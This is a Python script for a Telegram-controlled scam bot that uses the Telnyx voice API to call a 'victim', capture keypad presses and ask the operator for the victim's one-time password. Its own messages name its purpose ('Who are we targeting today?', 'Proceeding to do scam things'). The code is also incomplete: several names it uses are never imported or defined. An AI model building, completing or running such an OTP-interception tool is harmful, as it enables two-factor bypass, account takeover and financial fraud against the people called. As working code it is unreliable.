import os
from flask import Flask, request, jsonify
import requests
from telegram import Bot
from telegram.ext import CommandHandler, ApplicationBuilder, ContextTypes, CallbackContext

app = Flask(__name__)

# Fetch the secrets from environment variables
TELNYX_API_KEY = os.getenv('TELNYX_API_KEY')  # Fetch from GitHub Secrets
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')  # Fetch from GitHub Secrets
FROM_NUMBER = "+18445501649"  # Your Telnyx number, it can be set directly

# Initialize the Telegram bot
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# Telnyx API route to capture the victim's keypad input
@app.route('/telnyx_webhook', methods=['POST'])
def telnyx_webhook():
    data = request.json  # Process the incoming JSON data
    print(f"Received webhook: {data}")

    # Extract the necessary information from the webhook
    digit = data.get('digit', None)
    telegram_user_id = data.get('telegram_user_id')

    print(f"Digit pressed: {digit}, Telegram User ID: {telegram_user_id}")

    if digit == '1':
        # If the victim presses '1', ask the Telegram user for the OTP
        message = "Please provide the OTP sent by the victim."
        bot.send_message(chat_id=telegram_user_id, text=message)

    return 'OK', 200  # Acknowledge the webhook request

# /vic command to start collecting victim details
async def vic(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask for the victim's phone number."""
    await update.message.reply_text("Okay! Who are we targeting today?")
    return VICTIM_PHONE

# Step 1: Collect victim phone number
async def collect_victim_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["victim_phone"] = update.message.text
    victim_phone = context.user_data["victim_phone"]

    await update.message.reply_text(f"Proceeding with victim's phone number: {victim_phone}")
    return CONFIRMATION

# Handle the confirmation buttons
async def confirmation_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()  # Acknowledge the callback query

    if query.data == "accept":
        # User accepted the details, initiate the call to the victim
        victim_phone = context.user_data["victim_phone"]

        if ENABLE_TELNYX:
            try:
                # Create the call using the Telnyx API
                call = requests.post(
                    'https://api.telnyx.com/v2/calls',
                    json={
                        "connection_id": "2589680693504116148",  # Your Telnyx connection ID
                        "to": victim_phone,
                        "from": FROM_NUMBER,  # Your Telnyx number
                        "webhook_url": "https://your-webhook-url.com/telnyx_webhook",  # Your webhook URL for capturing digit input
                    },
                    headers={'Authorization': f'Bearer {TELNYX_API_KEY}'}
                )

                # Log the call initiation
                if call.status_code == 200:
                    await query.edit_message_text("Proceeding to do scam things.")
                else:
                    await query.edit_message_text(f"Error initiating call: {call.text}")
            except Exception as e:
                await query.edit_message_text(f"Failed to initiate call: {e}")
        else:
            # Provide manual call instructions if Telnyx API is disabled
            await query.edit_message_text("Proceeding manually with victim's phone number.")
    elif query.data == "decline":
        # User declined the details, cancel the operation
        await query.edit_message_text("Operation canceled.")

    return ConversationHandler.END

# /cancel command
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the operation."""
    await update.message.reply_text("Operation canceled.")
    return ConversationHandler.END

# Main function to start the bot
def main():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    # Conversation handler for /vic
    vic_handler = ConversationHandler(
        entry_points=[CommandHandler("vic", vic)],
        states={
            VICTIM_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, collect_victim_phone)],
            CONFIRMATION: [CallbackQueryHandler(confirmation_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(vic_handler)
    app.add_handler(CommandHandler("cancel", cancel))

    print("Bot is running... Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()

